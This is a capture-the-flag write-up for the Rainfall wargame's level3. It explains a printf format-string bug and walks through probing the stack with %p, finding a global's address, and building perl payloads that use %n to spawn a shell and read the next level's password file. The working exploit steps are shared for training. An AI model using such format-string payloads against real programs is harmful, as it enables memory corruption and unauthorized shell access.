# level3

Pull the executable:

```sh
sshpass -f ../level2/flag scp level3@rainfall:level3 .
```

See `source.c` for source reconstitution.

Something strikes immediately when analyzing this code: it passes a user buffer as format string for `printf`.  Compiling such code with `clang` (don't know why `gcc` doesn't) results in a warning: `format string is not a string literal (potentially insecure)`.  In the BUGS section, the man page of `printf(3)` states: 

```
Code such as printf(foo); often indicates a bug, since foo may contain
a % character.  If foo comes from untrusted user input, it may contain
%n, causing the printf() call to write to memory and creating a
security hole.
```

It also states:

```
The conversion specifiers and their meanings are:

[...]

n       The argument shall be a pointer to an integer into which is
        written the number of bytes written to the output so far by
        this call to one of the fprintf() functions. No argument is
        converted.
```

So, by providing a carefully forged input, we should be able to write somewhere in memory to do what we want.

Ghidra also shows that there is a call to `system("/bin/sh")`, guarded by a condition:

```c
if (m == 64) {
    fwrite("Wait what?!\n", 1, 12, stdout);
    system("/bin/sh");
}
```

However, `m` is not referenced anywhere else in the assembly.  It's read at one place and is never written.

But, before overwriting anything, we should probably mess around with the stack to see what's going on:

```sh
echo '%s' | ./level3
# -> Segmentation fault (core dumped)

echo '%p' | ./level3
# -> 0x200

echo '%p %p' | ./level3
# -> 0x200 0xb7fd1ac0

echo '%p %p %p %p' | ./level3
# -> 0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025

echo 'ABCD %p %p %p %p' | ./level3
# -> ABCD 0x200 0xb7fd1ac0 0xb7ff37d0 0x44434241

echo 'ABCD **** %p %p %p %p %p' | ./level3
# -> ABCD **** 0x200 0xb7fd1ac0 0xb7ff37d0 0x44434241 0x2a2a2a20

echo '%p  %p  %p  %p  %p  %p  ' | ./level3
# -> 0x200  0xb7fd1ac0  0xb7ff37d0  0x20207025  0x20207025  0x20207025
```

We can see several things:
1. Values 1, 2 and 3 look to be the same every time
2. Value 1 looks like an integer
3. Values 2 and 3 look like stack addresses
4. Values 4 and 5 seem to be the little endian hexadecimal representation of the format string

As it happens, value 1 (`0x200`) equals 512.  We know this is the size that is pushed onto the stack before calling `fgets(3)`.  We can safely assume that every value after 3 is the format string itself.  What's more, we can definitely say that we are effectively dumping the contents of the stack.  Nice.

Something else is very interesting;  because addresses are, in fact, just unsigned 32-bit integers (on this architecture), we see 512 encoded as an address (`0x200`).  This means that whatever we put in the format can be interpreted as an address.  This is exactly what the `printf(3)` man page said.  Now, we just need to get the address of `m`, put it in our forged format and use `"%n"` to write the value `64`.  Should be easy enough.

```sh
readelf -s level3 | grep ' m$'
# 66: 0804988c     4 OBJECT  GLOBAL DEFAULT   25 m
```

The address of `m` is `0x0804988c`.  Now, we need the format string.  We need `"%n"` to return `64` so that the condition `m == 64` is `true`.  We need to write 60 bytes after the address (`64 - sizeof(0x0804988c) = 60`).  But to make `printf(3)` use the address of `m` for the `"%s"` conversion, it needs to skip the first 3 arguments (`0x200`, `0xb7fd1ac0` and `0xb7ff37d0`).  For this, we have two choices: either add `"%x"` 3 times, or use positional arguments.  The former is easy and messy, the later is cleaner although non-standard (it is defined by POSIX and SUSv3, not standard C).  For completeness' sake, we'll include both.

For standard `printf(3)`, we need to calculate the size of the printed string.  Fortunately that's easy because we know the values: `len("0x200") + len("0xb7fd1ac0") + len("0xb7ff37d0") = 25`.  So we need `64 - 4 - 25 = 35` more bytes.

For positional arguments, we just need the right index (which is 4) and fill the buffer 60 bytes.

```sh
perl -e 'print pack("L<", 0x0804988c), "%p%p%p", "." x 35, "%n\n"' > /tmp/3

# or

perl -e 'print pack("L<", 0x0804988c), "." x 60, "%4\$n\n"' > /tmp/3
```

Now to test:

```sh
cat /tmp/3 - | ./level3
```

We get:

```
............................................................
Wait what?!
```


We can grab the flag using:

```sh
cat ~level4/.pass
```
